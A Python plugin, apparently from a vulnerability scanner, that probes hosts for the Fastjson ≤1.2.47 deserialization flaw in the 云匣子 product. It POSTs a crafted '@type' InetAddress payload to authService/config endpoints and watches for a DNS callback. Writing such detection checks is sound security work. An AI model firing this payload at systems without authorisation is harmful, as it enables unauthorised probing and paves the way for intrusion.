import requests

from celery_app.utils.utils import insert_vuln_db
from celery_app.utils.utils import get_dns_payload,have_record

#云匣子Fastjson =< 1.2.47 反序列化远程代码执行漏洞
plugin_id=43
default_port_list=[80,443,8080]


def check(host, port=443):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)

    subdomain, payload_dns = get_dns_payload()
    uris = ['/3.0/authService/config', '/2.0/authService/config', '/1.0/authService/config']
    payload = {"c": {"@type": "java.net.InetAddress", "val": payload_dns}, "b": {}}
    try:
        with requests.Session() as session:
            requests.packages.urllib3.disable_warnings()
            targets = ['{}{}'.format(target, uri) for uri in uris]
            for target in targets:
                try:
                    session.post(target, json=payload, timeout=5, verify=False)
                except:
                    pass
                finally:
                    if have_record(subdomain):
                        insert_vuln_db(host, target, payload_dns, plugin_id)
                        return True, host, target, payload_dns
        return False
    except:
        return False

